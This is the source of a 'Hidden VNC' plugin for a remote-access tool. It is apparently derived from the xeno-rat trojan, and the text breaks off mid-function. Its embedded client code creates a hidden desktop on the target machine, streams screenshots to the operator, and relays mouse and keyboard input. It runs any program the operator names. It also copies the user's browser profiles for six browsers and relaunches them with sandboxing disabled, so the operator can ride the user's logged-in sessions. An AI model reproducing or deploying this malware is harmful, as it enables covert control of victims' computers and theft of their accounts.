// File: Plugins/Builtin/HvncPlugin.cs
#nullable disable

using System;
using System.Collections.Concurrent;
using System.IO;
using System.Runtime.Versioning;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;

namespace WpfApp.Plugins.Builtin
{
    [SupportedOSPlatform("windows")]
    public class HvncPlugin : IServerPlugin
    {
        private PluginHost _host;
        private readonly ConcurrentDictionary<string, HvncUI> _clientUIs = new();

        public string PluginId => "hvnc";
        public string DisplayName => "Hidden VNC";
        public string Description => "Hidden desktop control with browser cloning (xeno-rat based)";
        public string Version => "3.0.0";

        public Task Initialize(PluginHost host) { _host = host; return Task.CompletedTask; }

        public Task Shutdown()
        {
            foreach (var ui in _clientUIs.Values) ui.Dispose();
            _clientUIs.Clear();
            return Task.CompletedTask;
        }

        public string GetClientCode()
        {
            return @"
using System;
using System.Collections.Generic;
using System.IO;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.Diagnostics;

namespace ClientPlugin_hvnc
{
    public class Main
    {
        private Func<byte[], Task> _send;
        private CancellationTokenSource _cts;
        private IntPtr _hDesk;
        private volatile bool _streaming;
        private int _quality = 60;
        private bool _doClone;
        private bool _cloningChrome, _cloningFirefox, _cloningEdge, _cloningOpera, _cloningOperaGX, _cloningBrave;
        private bool _hasClonedChrome, _hasClonedFirefox, _hasClonedEdge, _hasClonedOpera, _hasClonedOperaGX, _hasClonedBrave;
        private ImageCodecInfo _jc;
        private string _deskName;

        [DllImport(""user32.dll"", SetLastError=true, CharSet=CharSet.Unicode)]
        static extern IntPtr CreateDesktopW(string n, IntPtr d, IntPtr dm, int f, uint a, IntPtr sa);
        [DllImport(""user32.dll"", SetLastError=true)]
        static extern bool CloseDesktop(IntPtr h);
        [DllImport(""user32.dll"")]
        static extern IntPtr GetThreadDesktop(int t);
        [DllImport(""kernel32.dll"")]
        static extern int GetCurrentThreadId();
        [DllImport(""user32.dll"", SetLastError=true)]
        static extern bool SetThreadDesktop(IntPtr h);
        [DllImport(""user32.dll"")]
        static extern IntPtr GetDC(IntPtr h);
        [DllImport(""user32.dll"")]
        static extern int ReleaseDC(IntPtr w, IntPtr d);
        [DllImport(""gdi32.dll"")]
        static extern IntPtr CreateCompatibleDC(IntPtr h);
        [DllImport(""gdi32.dll"")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr h, int w, int ht);
        [DllImport(""gdi32.dll"")]
        static extern IntPtr SelectObject(IntPtr h, IntPtr o);
        [DllImport(""gdi32.dll"")]
        static extern bool DeleteObject(IntPtr h);
        [DllImport(""gdi32.dll"")]
        static extern bool DeleteDC(IntPtr h);
        [DllImport(""user32.dll"")]
        static extern bool IsWindowVisible(IntPtr h);
        [DllImport(""user32.dll"")]
        static extern bool GetWindowRect(IntPtr h, out RECT r);
        [DllImport(""user32.dll"")]
        static extern bool PrintWindow(IntPtr h, IntPtr hdc, uint f);
        [DllImport(""user32.dll"", SetLastError=true)]
        static extern IntPtr GetWindow(IntPtr h, uint c);
        [DllImport(""user32.dll"")]
        static extern bool PostMessageW(IntPtr h, uint m, IntPtr w, IntPtr l);
        [DllImport(""user32.dll"")]
        static extern IntPtr SendMessageW(IntPtr h, uint m, IntPtr w, IntPtr l);
        [DllImport(""user32.dll"")]
        static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, IntPtr dwExtraInfo);
        [DllImport(""user32.dll"")]
        static extern bool SetCursorPos(int x, int y);
        [DllImport(""user32.dll"")]
        static extern IntPtr WindowFromPoint(POINT p);
        [DllImport(""user32.dll"")]
        static extern bool ScreenToClient(IntPtr h, ref POINT p);
        [DllImport(""user32.dll"")]
        static extern IntPtr ChildWindowFromPoint(IntPtr h, POINT p);
        [DllImport(""user32.dll"")]
        static extern int GetWindowText(IntPtr h, StringBuilder s, int n);
        [DllImport(""user32.dll"")]
        static extern bool PtInRect(ref RECT r, POINT p);
        [DllImport(""user32.dll"")]
        static extern int SetWindowLong(IntPtr h, int i, int v);
        [DllImport(""user32.dll"")]
        static extern int GetWindowLong(IntPtr h, int i);
        [DllImport(""user32.dll"")]
        static extern bool GetWindowPlacement(IntPtr h, ref WINDOWPLACEMENT wp);
        [DllImport(""user32.dll"")]
        static extern IntPtr FindWindow(string cls, string wnd);
        [DllImport(""user32.dll"")]
        static extern int MenuItemFromPoint(IntPtr w, IntPtr m, POINT p);
        [DllImport(""user32.dll"")]
        static extern int GetMenuItemID(IntPtr m, int p);
        [DllImport(""user32.dll"")]
        static extern IntPtr GetSubMenu(IntPtr h, int p);
        [DllImport(""user32.dll"")]
        static extern bool MoveWindow(IntPtr h, int x, int y, int w, int height, bool r);
        [DllImport(""user32.dll"", CharSet=CharSet.Auto)]
        static extern int RealGetWindowClass(IntPtr h, StringBuilder s, int n);
        [DllImport(""kernel32.dll"", SetLastError=true, CharSet=CharSet.Unicode)]
        static extern bool CreateProcess(string app, string cmd, IntPtr pa, IntPtr ta, bool inh, uint flags, IntPtr env, string dir, ref STARTUPINFO si, ref PROCESS_INFORMATION pi);
        [DllImport(""kernel32.dll"")]
        static extern bool CloseHandle(IntPtr h);
        [DllImport(""gdi32.dll"")]
        static extern int GetDeviceCaps(IntPtr h, int i);
        [DllImport(""SHCore.dll"")]
        static extern int SetProcessDpiAwareness(int a);
        [DllImport(""user32.dll"")]
        static extern IntPtr GetTopWindow(IntPtr h);
        [DllImport(""user32.dll"")]
        static extern IntPtr GetDesktopWindow();
        [DllImport(""user32.dll"")]
        static extern bool EnumDesktopWindows(IntPtr h, EWP cb, IntPtr lp);
        [DllImport(""user32.dll"")]
        static extern uint GetWindowThreadProcessId(IntPtr h, out uint pid);
        [DllImport(""user32.dll"")]
        static extern IntPtr GetFocus();
        [DllImport(""user32.dll"")]
        static extern IntPtr SetFocus(IntPtr hWnd);
        delegate bool EWP(IntPtr h, IntPtr lp);

        const int GWL_STYLE = -16;
        const int WS_DISABLED = 0x8000000;
        const int WM_CHAR = 0x0102;
        const int WM_KEYDOWN = 0x0100;
        const int WM_KEYUP = 0x0101;
        const int WM_CONTEXTMENU = 0x007B;
        const int WM_LBUTTONUP = 0x0202;
        const int WM_LBUTTONDOWN = 0x0201;
        const int WM_MOUSEMOVE = 0x0200;
        const int WM_RBUTTONDOWN = 0x0204;
        const int WM_RBUTTONUP = 0x0205;
        const int WM_MBUTTONDOWN = 0x0207;
        const int WM_MBUTTONUP = 0x0208;
        const int WM_CLOSE = 0x0010;
        const int WM_SYSCOMMAND = 0x0112;
        const int SC_MINIMIZE = 0xF020;
        const int SC_RESTORE = 0xF120;
        const int SC_MAXIMIZE = 0xF030;
        const int HTCAPTION = 2;
        const int HTTOP = 12; const int HTBOTTOM = 15; const int HTLEFT = 10; const int HTRIGHT = 11;
        const int HTTOPLEFT = 13; const int HTTOPRIGHT = 14; const int HTBOTTOMLEFT = 16; const int HTBOTTOMRIGHT = 17;
        const int HTCLOSE = 20; const int HTMINBUTTON = 8; const int HTMAXBUTTON = 9;
        const int HTTRANSPARENT = -1;
        const int VK_RETURN = 0x0D;
        const int MN_GETHMENU = 0x01E1;
        const int BM_CLICK = 0x00F5;
        const int MAX_PATH = 260;
        const int WM_NCHITTEST = 0x0084;
        const int SW_SHOWMAXIMIZED = 3;
        const uint GENERIC_ALL = 0x1FF;
        const int STARTF_USESHOWWINDOW = 1;
        const uint CREATE_NEW_CONSOLE = 0x10;
        const uint PW_RENDERFULLCONTENT = 2;
        const uint KEYEVENTF_KEYUP = 0x0002;
        const uint MOUSEEVENTF_MOVE = 0x0001;
        const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
        const uint MOUSEEVENTF_LEFTUP = 0x0004;
        const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
        const uint MOUSEEVENTF_RIGHTUP = 0x0010;
        const uint MOUSEEVENTF_MIDDLEDOWN = 0x0020;
        const uint MOUSEEVENTF_MIDDLEUP = 0x0040;

        [DllImport(""user32.dll"")]
        static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, IntPtr dwExtraInfo);

        [StructLayout(LayoutKind.Sequential)] struct RECT { public int L,T,R,B; }
        [StructLayout(LayoutKind.Sequential)] struct POINT { public int X,Y; }
        [StructLayout(LayoutKind.Sequential)] struct WINDOWPLACEMENT { public int length,flags,showCmd; public POINT ptMin,ptMax; public RECT rcNormal; }
        [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
        struct STARTUPINFO { public int cb; public string lpReserved,lpDesktop,lpTitle; public int dwX,dwY,dwXSize,dwYSize,dwXCountChars,dwYCountChars,dwFillAttribute,dwFlags; public short wShowWindow,cbReserved2; public IntPtr lpReserved2,hStdInput,hStdOutput,hStdError; }
        [StructLayout(LayoutKind.Sequential)] struct PROCESS_INFORMATION { public IntPtr hProcess,hThread; public uint dwProcessId,dwThreadId; }

        static int GET_X(IntPtr l) { return (short)(l.ToInt32() & 0xFFFF); }
        static int GET_Y(IntPtr l) { return (short)((l.ToInt32() >> 16) & 0xFFFF); }
        static IntPtr MAKELP(int lo, int hi) { return (IntPtr)((hi << 16) | (lo & 0xFFFF)); }

        static float GetScalingFactor()
        {
            IntPtr dc = GetDC(IntPtr.Zero);
            int logical = GetDeviceCaps(dc, 10);
            int physical = GetDeviceCaps(dc, 117);
            ReleaseDC(IntPtr.Zero, dc);
            return (float)physical / logical;
        }

        void LogS(string m)
        {
            try { byte[] b = Encoding.UTF8.GetBytes(m); byte[] p = new byte[b.Length + 1]; p[0] = 0xFD; Buffer.BlockCopy(b, 0, p, 1, b.Length); _send(p).Wait(2000); } catch {}
        }

        async Task LogA(string m)
        {
            try { byte[] b = Encoding.UTF8.GetBytes(m); byte[] p = new byte[b.Length + 1]; p[0] = 0xFD; Buffer.BlockCopy(b, 0, p, 1, b.Length); await _send(p); } catch {}
        }

        static ImageCodecInfo GetJC()
        {
            foreach (var c in ImageCodecInfo.GetImageEncoders()) if (c.MimeType == ""image/jpeg"") return c;
            return null;
        }

        bool DrawApplication(IntPtr hWnd, Graphics g, IntPtr dc, float sf)
        {
            RECT r;
            if (!GetWindowRect(hWnd, out r)) return false;
            int w = (int)((r.R - r.L) * sf), h = (int)((r.B - r.T) * sf);
            if (w <= 0 || h > 8000) return false;
            IntPtr hDcW = CreateCompatibleDC(dc);
            IntPtr hBmpW = CreateCompatibleBitmap(dc, w, h);
            SelectObject(hDcW, hBmpW);
            bool ok = PrintWindow(hWnd, hDcW, PW_RENDERFULLCONTENT);
            if (!ok) ok = PrintWindow(hWnd, hDcW, 0);
            if (ok)
            {
                try { using (var bmp = Image.FromHbitmap(hBmpW)) { g.DrawImage(bmp, r.L, r.T); } } catch { ok = false; }
            }
            DeleteObject(hBmpW);
            DeleteDC(hDcW);
            return ok;
        }

        void DrawTopDown(IntPtr owner, Graphics g, IntPtr dc, float sf)
        {
            IntPtr cur = GetTopWindow(owner);
            if (cur == IntPtr.Zero) return;
            cur = GetWindow(cur, 1);
            if (cur == IntPtr.Zero) return;
            while (cur != IntPtr.Zero)
            {
                if (IsWindowVisible(cur)) DrawApplication(cur, g, dc, sf);
                cur = GetWindow(cur, 3);
            }
        }

        Bitmap CaptureDesktop()
        {
            float sf = GetScalingFactor();
            IntPtr dc = GetDC(IntPtr.Zero);
            RECT desk;
            GetWindowRect(GetDesktopWindow(), out desk);
            int w = (int)(desk.R * sf), h = (int)(desk.B * sf);
            if (_cacheBmp == null || _cacheW != w || _cacheH != h)
            {
                if (_cacheBmp != null) { _cacheBmp.Dispose(); if (_cacheGfx != null) _cacheGfx.Dispose(); }
                _cacheBmp = new Bitmap(w, h);
                _cacheGfx = Graphics.FromImage(_cacheBmp);
                _cacheW = w; _cacheH = h;
            }
            _cacheGfx.Clear(Color.Black);
            DrawTopDown(IntPtr.Zero, _cacheGfx, dc, sf);
            ReleaseDC(IntPtr.Zero, dc);
            return _cacheBmp;
        }

        bool CreateProc(string path)
        {
            SetThreadDesktop(_hDesk);
            var si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
            si.lpDesktop = _deskName;
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = 5;
            var pi = new PROCESS_INFORMATION();
            bool ok = CreateProcess(null, path, IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref si, ref pi);
            if (ok) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
            return ok;
        }

        string GetChromePath()
        {
            var p = Registry.GetValue(@""HKEY_CLASSES_ROOT\ChromeHTML\shell\open\command"", null, null) as string;
            if (p != null) { var s = p.Split('""'); p = s.Length >= 2 ? s[1] : null; }
            return p;
        }

        string GetEdgePath()
        {
            using (var k = Registry.LocalMachine.OpenSubKey(@""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe""))
            { if (k != null) { var o = k.GetValue(""""); if (o != null) return o.ToString(); } }
            return null;
        }

        string GetFirefoxPath()
        {
            using (var k = Registry.LocalMachine.OpenSubKey(@""SOFTWARE\Mozilla\Mozilla Firefox""))
            {
                if (k != null)
                {
                    string ver = k.GetValue(""CurrentVersion"") == null ? null : k.GetValue(""CurrentVersion"").ToString();
                    if (ver != null)
                    {
                        using (var pk = Registry.LocalMachine.OpenSubKey(string.Format(@""SOFTWARE\Mozilla\Mozilla Firefox\{0}\Main"", ver)))
                        { if (pk != null) return pk.GetValue(""PathToExe"") == null ? null : pk.GetValue(""PathToExe"").ToString(); }
                    }
                }
            }
            return null;
        }

        string GetBravePath()
        {
            var p = Registry.GetValue(@""HKEY_CLASSES_ROOT\BraveHTML\shell\open\command"", null, null) as string;
            if (p != null) { var s = p.Split('""'); p = s.Length >= 2 ? s[1] : null; }
            return p;
        }

        string GetOperaPath()
        {
            using (var k = Registry.CurrentUser.OpenSubKey(@""SOFTWARE\Clients\StartMenuInternet""))
            {
                if (k != null)
                {
                    foreach (var sn in k.GetSubKeyNames())
                    {
                        if (sn.Contains(""Opera"") && !sn.Contains(""GX""))
                        {
                            using (var ck = k.OpenSubKey(string.Format(@""{0}\shell\open\command"", sn)))
                            { if (ck != null) return ck.GetValue("""") == null ? null : ck.GetValue("""").ToString().Trim('""'); }
                        }
                    }
                }
            }
            return null;
        }

        string GetOperaGXPath()
        {
            using (var k = Registry.CurrentUser.OpenSubKey(@""SOFTWARE\Clients\StartMenuInternet""))
            {
                if (k != null)
                {
                    foreach (var sn in k.GetSubKeyNames())
                    {
                        if (sn.Contains(""Opera"") && sn.Contains(""GX""))
                        {
                            using (var ck = k.OpenSubKey(string.Format(@""{0}\shell\open\command"", sn)))
                            { if (ck != null) return ck.GetValue("""") == null ? null : ck.GetValue("""").ToString().Trim('""'); }
                        }
                    }
                }
            }
            return null;
        }

        async Task CopyDirAsync(string src, string dst)
        {
            foreach (string dir in Directory.EnumerateDirectories(src, ""*"", SearchOption.AllDirectories))
            {
                string rel = dir.Substring(src.Length + 1);
                Directory.CreateDirectory(Path.Combine(dst, rel));
            }
            var files = Directory.EnumerateFiles(src, ""*"", SearchOption.AllDirectories);
            var sem = new SemaphoreSlim(10);
            var tasks = new List<Task>();
            foreach (string f in files)
            {
                string rel = f.Substring(src.Length + 1);
                string dest = Path.Combine(dst, rel);
                tasks.Add(Task.Run(async () => { await sem.WaitAsync(); try { File.Copy(f, dest, true); } finally { sem.Release(); } }));
            }
            await Task.WhenAll(tasks);
        }

        string RecursiveFileSearch(string dir, string target)
        {
            if (File.Exists(Path.Combine(dir, target))) return dir;
            foreach (string sub in Directory.GetDirectories(dir))
            { string r = RecursiveFileSearch(sub, target); if (r != null) return r; }
            return null;
        }

        async Task CloneBrowser(string dataDir, string source)
        {
            try
            {
                if (Directory.Exists(dataDir)) { await Task.Run(() => Directory.Delete(dataDir, true)); }
                Directory.CreateDirectory(dataDir);
                if (Directory.Exists(source)) await CopyDirAsync(source, dataDir);
            }
            catch { LogS(""[HVNC] Clone failed: "" + dataDir); }
        }

        bool StartChrome()
        {
            string path = GetChromePath();
            if (path == null || !File.Exists(path)) return false;
            return CreateProc(""\"""" + path + ""\"" --no-sandbox --allow-no-sandbox-job --disable-gpu --user-data-dir=C:\\ChromeAutomationData"");
        }

        bool StartEdge()
        {
            string path = GetEdgePath();
            if (path == null || !File.Exists(path)) return false;
            return CreateProc(""\"""" + path + ""\"" --no-sandbox --allow-no-sandbox-job --disable-gpu --user-data-dir=C:\\EdgeAutomationData"");
        }

        bool StartFirefox()
        {
            string path = GetFirefoxPath();
            if (path == null || !File.Exists(path)) return false;
            return CreateProc(""\"""" + path + ""\"" -no-remote -profile C:\\FirefoxAutomationData"");
        }

        bool StartBrave()
        {
            string path = GetBravePath();
            if (path == null || !File.Exists(path)) return false;
            return CreateProc(""\"""" + path + ""\"" --no-sandbox --allow-no-sandbox-job --disable-gpu --user-data-dir=C:\\BraveAutomationData"");
        }

        bool StartOpera()
        {
            string path = GetOperaPath();
            if (path == null || !File.Exists(path)) return false;
            return CreateProc(""\"""" + path + ""\"" --no-sandbox --allow-no-sandbox-job --disable-gpu --user-data-dir=C:\\OperaAutomationData"");
        }

        bool StartOperaGX()
        {
            string path = GetOperaGXPath();
            if (path == null || !File.Exists(path)) return false;
            return CreateProc(""\"""" + path + ""\"" --no-sandbox --allow-no-sandbox-job --disable-gpu --user-data-dir=C:\\OperaGXAutomationData"");
        }

        async Task HandleCloneChrome()
        {
            if (_cloningChrome) return; _cloningChrome = true;
            if (!_hasClonedChrome)
            {
                _hasClonedChrome = true;
                await CloneBrowser(@""C:\ChromeAutomationData"", string.Format(@""C:\Users\{0}\AppData\Local\Google\Chrome\User Data"", Environment.UserName));
            }
            StartChrome();
            _cloningChrome = false;
        }

        async Task HandleCloneFirefox()
        {
            if (_cloningFirefox) return; _cloningFirefox = true;
            if (!_hasClonedFirefox)
            {
                _hasClonedFirefox = true;
                string src = RecursiveFileSearch(string.Format(@""C:\Users\{0}\AppData\Roaming\Mozilla\Firefox\Profiles"", Environment.UserName), ""addons.json"");
                if (src != null) await CloneBrowser(@""C:\FirefoxAutomationData"", src);
            }
            StartFirefox();
            _cloningFirefox = false;
        }

        async Task HandleCloneEdge()
        {
            if (_cloningEdge) return; _cloningEdge = true;
            if (!_hasClonedEdge)
            {
                _hasClonedEdge = true;
                await CloneBrowser(@""C:\EdgeAutomationData"", string.Format(@""C:\Users\{0}\AppData\Local\Microsoft\Edge\User Data"", Environment.UserName));
            }
            StartEdge();
            _cloningEdge = false;
        }

        async Task HandleCloneOpera()
        {
            if (_cloningOpera) return; _cloningOpera = true;
            if (!_hasClonedOpera)
            {
                _hasClonedOpera = true;
                await CloneBrowser(@""C:\OperaAutomationData"", string.Format(@""C:\Users\{0}\AppData\Roaming\Opera Software\Opera Stable"", Environment.UserName));
            }
            StartOpera();
            _cloningOpera = false;
        }

        async Task HandleCloneOperaGX()
        {
            if (_cloningOperaGX) return; _cloningOperaGX = true;
            if (!_hasClonedOperaGX)
            {
                _hasClonedOperaGX = true;
                await CloneBrowser(@""C:\OperaGXAutomationData"", string.Format(@""C:\Users\{0}\AppData\Roaming\Opera Software\Opera GX Stable"", Environment.UserName));
            }
            StartOperaGX();
            _cloningOperaGX = false;
        }

        async Task HandleCloneBrave()
        {
            if (_cloningBrave) return; _cloningBrave = true;
            if (!_hasClonedBrave)
            {
                _hasClonedBrave = true;
                await CloneBrowser(@""C:\BraveAutomationData"", string.Format(@""C:\Users\{0}\AppData\Local\BraveSoftware\Brave-Browser\User Data"", Environment.UserName));
            }
            StartBrave();
            _cloningBrave = false;
        }

        private POINT _lastPoint;
        private IntPtr _hResMove = IntPtr.Zero;
        private IntPtr _resMoveType = IntPtr.Zero;
        private bool _lmDown;
        private readonly object _inputLock = new object();
        private Bitmap _cacheBmp;
        private Graphics _cacheGfx;
        private int _cacheW, _cacheH;
        private readonly MemoryStream _jpegStream = new MemoryStream(512 * 1024);
        private readonly EncoderParameters _encParams = new EncoderParameters(1);
        private volatile int _sending;

        void HandleInput(uint msg, IntPtr wParam, IntPtr lParam)
        {
            lock (_inputLock)
            {
                SetThreadDesktop(_hDesk);
                IntPtr hWnd = IntPtr.Zero;
                POINT pt;
                POINT lastCopy;
                bool mouseMsg = false;

                switch (msg)
                {
                    case WM_CHAR:
                    case WM_KEYDOWN:
                    case WM_KEYUP:
                        pt = _lastPoint;
                        hWnd = WindowFromPoint(pt);
                        mouseMsg = false;
                        break;
                    default:
                        mouseMsg = true;
                        pt.X = GET_X(lParam);
                        pt.Y = GET_Y(lParam);
                        lastCopy = _lastPoint;
                        _lastPoint = pt;
                        hWnd = WindowFromPoint(pt);

                        if (msg == WM_LBUTTONUP)
                        {
                            _lmDown = false;
                            IntPtr lr = SendMessageW(hWnd, WM_NCHITTEST, IntPtr.Zero, lParam);
                            switch (lr.ToInt32())
                            {
                                case HTCLOSE: PostMessageW(hWnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero); return;
                                case HTMINBUTTON: PostMessageW(hWnd, WM_SYSCOMMAND, (IntPtr)SC_MINIMIZE, IntPtr.Zero); return;
                                case HTMAXBUTTON:
                                    var wp = new WINDOWPLACEMENT();
                                    wp.length = Marshal.SizeOf(wp);
                                    GetWindowPlacement(hWnd, ref wp);
                                    if ((wp.flags & SW_SHOWMAXIMIZED) != 0)
                                        PostMessageW(hWnd, WM_SYSCOMMAND, (IntPtr)SC_RESTORE, IntPtr.Zero);
                                    else
                                        PostMessageW(hWnd, WM_SYSCOMMAND, (IntPtr)SC_MAXIMIZE, IntPtr.Zero);
                                    return;
                            }
                        }
                        else if (msg == WM_LBUTTONDOWN)
                        {
                            _lmDown = true;
                            _hResMove = IntPtr.Zero;
                            RECT sbr;
                            IntPtr hs = FindWindow(""Button"", null);
                            GetWindowRect(hs, out sbr);
                            if (PtInRect(ref sbr, pt))
                            {
                                PostMessageW(hs, BM_CLICK, IntPtr.Zero, IntPtr.Zero);
                                return;
                            }
                            else
                            {
                                var cls = new StringBuilder(MAX_PATH);
                                RealGetWindowClass(hWnd, cls, MAX_PATH);
                                if (cls.ToString() == ""#32768"")
                                {
                                    IntPtr hm = GetSubMenu(hWnd, 0);
                                    int ip = MenuItemFromPoint(IntPtr.Zero, hm, pt);
                                    PostMessageW(hWnd, 0x1E5, (IntPtr)ip, IntPtr.Zero);
                                    PostMessageW(hWnd, WM_KEYDOWN, (IntPtr)VK_RETURN, IntPtr.Zero);
                                    return;
                                }
                            }
                        }
                        else if (msg == WM_MOUSEMOVE)
                        {
                            if (!_lmDown) return;
                            if (_hResMove == IntPtr.Zero)
                                _resMoveType = SendMessageW(hWnd, WM_NCHITTEST, IntPtr.Zero, lParam);
                            else
                                hWnd = _hResMove;

                            int mx = lastCopy.X - pt.X, my = lastCopy.Y - pt.Y;
                            RECT r;
                            GetWindowRect(hWnd, out r);
                            int x = r.L, y = r.T, w = r.R - r.L, h = r.B - r.T;
                            switch (_resMoveType.ToInt32())
                            {
                                case HTCAPTION: x -= mx; y -= my; break;
                                case HTTOP: y -= my; h += my; break;
                                case HTBOTTOM: h -= my; break;
                                case HTLEFT: x -= mx; w += mx; break;
                                case HTRIGHT: w -= mx; break;
                                case HTTOPLEFT: y -= my; h += my; x -= mx; w += mx; break;
                                case HTTOPRIGHT: y -= my; h += my; w -= mx; break;
                                case HTBOTTOMLEFT: h -= my; x -= mx; w += mx; break;
                                case HTBOTTOMRIGHT: h -= my; w -= mx; break;
                                default: return;
                            }
                            MoveWindow(hWnd, x, y, w, h, false);
                            _hResMove = hWnd;
                            return;
                        }
                        break;
                }

                for (IntPtr ch = hWnd; ; )
                {
                    hWnd = ch;
                    ScreenToClient(hWnd, ref pt);
                    ch = ChildWindowFromPoint(hWnd, pt);
                    if (ch == IntPtr.Zero || ch == hWnd) break;
                }

                if (mouseMsg)
                {
                    lParam = MAKELP(pt.X, pt.Y);
                    switch (msg)
                    {
                        case WM_LBUTTONDOWN:
                            PostMessageW(hWnd, WM_MOUSEMOVE, (IntPtr)1, lParam);
                            PostMessageW(hWnd, WM_LBUTTONDOWN, (IntPtr)1, lParam);
                            break;
                        case WM_LBUTTONUP:
                            PostMessageW(hWnd, WM_LBUTTONUP, IntPtr.Zero, lParam);
                            break;
                        case WM_RBUTTONDOWN:
                            PostMessageW(hWnd, WM_RBUTTONDOWN, (IntPtr)0, lParam);
                            PostMessageW(hWnd, WM_CONTEXTMENU, hWnd, lParam);
                            break;
                        case WM_RBUTTONUP:
                            PostMessageW(hWnd, WM_RBUTTONUP, IntPtr.Zero, lParam);
                            break;
                        case WM_MBUTTONDOWN:
                            PostMessageW(hWnd, WM_MBUTTONDOWN, (IntPtr)0, lParam);
                            break;
                        case WM_MBUTTONUP:
                            PostMessageW(hWnd, WM_MBUTTONUP, IntPtr.Zero, lParam);
                            break;
                        default:
                            PostMessageW(hWnd, msg, wParam, lParam);
                            break;
                    }
                }
                else
                    PostMessageW(hWnd, msg, wParam, lParam);
            }
        }

        public async Task Run(Func<byte[], Task> sendData, Func<Task<byte[]>> receiveData)
        {
            _send = sendData;
            _cts = new CancellationTokenSource();
            _jc = GetJC();
            string fatal = null;

            try
            {
                await LogA(""[HVNC] Init v3.0 (xeno-rat based)..."");
                SetProcessDpiAwareness(2);
                _deskName = ""HV_"" + Guid.NewGuid().ToString(""N"").Substring(0, 8);
                _hDesk = CreateDesktopW(_deskName, IntPtr.Zero, IntPtr.Zero, 0, GENERIC_ALL, IntPtr.Zero);
                if (_hDesk == IntPtr.Zero) { await LogA(""[HVNC] CreateDesktop failed err="" + Marshal.GetLastWin32Error()); return; }
                await LogA(""[HVNC] Desktop="" + _deskName);

                CreateProc(@""C:\Windows\explorer.exe"");
                await LogA(""[HVNC] Explorer launched"");
                await Task.Delay(1500);

                var rxTask = Task.Run(async () =>
                {
                    try
                    {
                        while (!_cts.IsCancellationRequested)
                        {
                            byte[] d = null;
                            try { d = await receiveData(); } catch { break; }
                            if (d == null || d.Length == 0) break;
                            try { await HandleCmd(d); } catch (Exception ex) { LogS(""[HVNC] Cmd err: "" + ex.Message); }
                        }
                    }
                    catch { }
                });

                var capTask = Task.Run(async () => await CaptureLoop());

                await Task.WhenAny(rxTask, capTask);
            }
            catch (Exception ex) { fatal = ex.Message; }
            finally { _cts.Cancel(); if (fatal != null) LogS(""[HVNC] Fatal: "" + fatal); Cleanup(); }
        }

        async Task HandleCmd(byte[] d)
        {
            if (d == null || d.Length == 0) return;
            switch (d[0])
            {
                case 0x00: _streaming = true; LogS(""[HVNC] Streaming started""); break;
                case 0x01: _streaming = false; LogS(""[HVNC] Streaming stopped""); break;
                case 0x02:
                    if (d.Length >= 5) { _quality = BitConverter.ToInt32(d, 1); if (_quality < 10) _quality = 10; if (_quality > 100) _quality = 100; LogS(""[HVNC] Quality="" + _quality); }
                    break;
                case 0x03:
                    if (d.Length >= 13)
                    {
                        uint msg = (uint)BitConverter.ToInt32(d, 1);
                        IntPtr wp = (IntPtr)BitConverter.ToInt32(d, 5);
                        IntPtr lp = (IntPtr)BitConverter.ToInt32(d, 9);
                        await Task.Run(() => HandleInput(msg, wp, lp));
                    }
                    break;
                case 0x04: CreateProc(@""C:\Windows\explorer.exe""); break;
                case 0x05:
                    if (d.Length > 1)
                    {
                        string path = Encoding.UTF8.GetString(d, 1, d.Length - 1);
                        CreateProc(path);
                    }
                    break;
                case 0x06: _doClone = true; LogS(""[HVNC] Browser clone enabled""); break;
                case 0x07: _doClone = false; LogS(""[HVNC] Browser clone disabled""); break;
                case 0x08:
                    if (_doClone && !_hasClonedChrome) await HandleCloneChrome(); else StartChrome();
                    break;
                case 0x09:
                    if (_doClone && !_hasClonedFirefox) await HandleCloneFirefox(); else StartFirefox();
                    break;
                case 0x0A:
                    if (_doClone && !_hasClonedEdge) await HandleCloneEdge(); else StartEdge();
                    break;
                case 0x0B:
                    if (_doClone && !_hasClonedOpera) await HandleCloneOpera(); else StartOpera();
                    break;
                case 0x0C:
                    if (_doClone && !_hasClonedOperaGX) await HandleCloneOperaGX(); else StartOperaGX();
                    break;
                case 0x0D:
                    if (_doClone && !_hasClonedBrave) await HandleCloneBrave(); else StartBrave();
                    break;
                case 0x0E:
                    KillAll();
                    break;
            }
        }

        void KillAll()
        {
            try
            {
                if (_hDesk != IntPtr.Zero)
                {
                    var pids = new System.Collections.Generic.HashSet<uint>();
                    EnumDesktopWindows(_hDesk, (hw, lp) => { uint pid; GetWindowThreadProcessId(hw, out pid); if (pid != 0) pids.Add(pid); return true; }, IntPtr.Zero);
                    foreach (uint pid in pids)
                    {
                        try
                        {
                            var p = Process.GetProcessById((int)pid);
                            if (p != null && !p.HasExited && !p.ProcessName.Equals(""explorer"", StringComparison.OrdinalIgnoreCase))
                                p.Kill();
                        }
                        catch {}
                    }
                }
            }
            catch {}
        }

        async Task CaptureLoop()
        {
            try
                {
                    LogS(""[HVNC] Capture thread ready"");
                    var sw = new System.Diagnostics.Stopwatch();
                    while (!_cts.IsCancellationRequested)
                    {
                        SetThreadDesktop(_hDesk);
                        if (!_streaming) { await Task.Delay(500); continue; }

                        if (_sending != 0)
                        {
                            await Task.Delay(5);
                            continue;
                        }

                        _sending = 1;
                        try
                        {
                            sw.Restart();
                            var bmp = CaptureDesktop();
                            _encParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)_quality);
                            _jpegStream.SetLength(0);
                            bmp.Save(_jpegStream, _jc, _encParams);
                            byte[] data = _jpegStream.ToArray();
                            if (data != null && data.Length > 0)
                            {
                                byte[] frame = new byte[9 + data.Length];
                                frame[0] = 0x80;
